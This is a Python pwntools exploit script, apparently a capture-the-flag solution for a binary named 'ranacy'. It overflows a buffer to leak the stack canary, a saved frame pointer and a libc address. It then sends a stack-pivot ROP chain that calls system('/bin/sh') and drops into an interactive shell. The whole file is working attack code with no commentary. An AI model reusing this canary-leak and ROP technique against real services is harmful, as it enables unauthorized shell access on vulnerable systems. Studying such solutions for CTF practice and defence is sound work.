#!/usr/bin/python3
from pwn import *
exe=ELF('./ranacy_patched',checksec=False)
libc=ELF('libc.so.6',checksec=False)
p=process(exe.path)

p.sendlineafter(b'>', b'1')
p.sendafter(b'Please enter some data:\n> ',b'A'*265)
p.sendlineafter(b'>',b'2')
p.recvuntil(b'A'*265)
canary=u64(b'\0'+p.recv(7))
log.info('canary: '+hex(canary))

p.sendlineafter(b'>',b'1')
p.sendafter(b'Please enter some data:\n> ',b'A'*272)
p.sendlineafter(b'>', b'2')
p.recvuntil(b'A'*272)
leak_rbp=u64(p.recv(6)+b'\x00\x00')
log.info('leak_rbp: '+hex(leak_rbp))

payload=b'A'*264
payload+=p64(canary)
payload+=p64(0x404088)
payload+=p64(exe.sym['main'])
p.sendlineafter(b'>',b'1')
p.sendafter(b'Please enter some data:\n> ',payload)

p.sendlineafter(b'>',b'1')
p.sendafter(b'Please enter some data:\n> ',b'A'*288)
p.sendlineafter(b'>', b'2')
p.recvuntil(b' '*8)
leak_libc=u64(p.recv(6)+b'\x00\x00')
log.info('leak_libc: '+hex(leak_libc))

libc.address=leak_libc-0x29d90
log.info('libc base: '+hex(libc.address))
pop_rdi=libc.address+0x000000000002a3e5
leave=libc.address+0x000000000004da83
ret=libc.address+0x0000000000029139

payload=b'A'*8
payload+=p64(ret)
payload+=p64(pop_rdi)+p64(next(libc.search(b'/bin/sh')))
payload+=p64(libc.sym['system'])
payload=payload.ljust(264,b'A')
payload+=p64(canary)
payload+=p64(leak_rbp-0x120)
payload+=p64(leave)

input()
p.sendlineafter(b'>',b'1')
p.sendafter(b'Please enter some data:\n> ',payload)

p.interactive()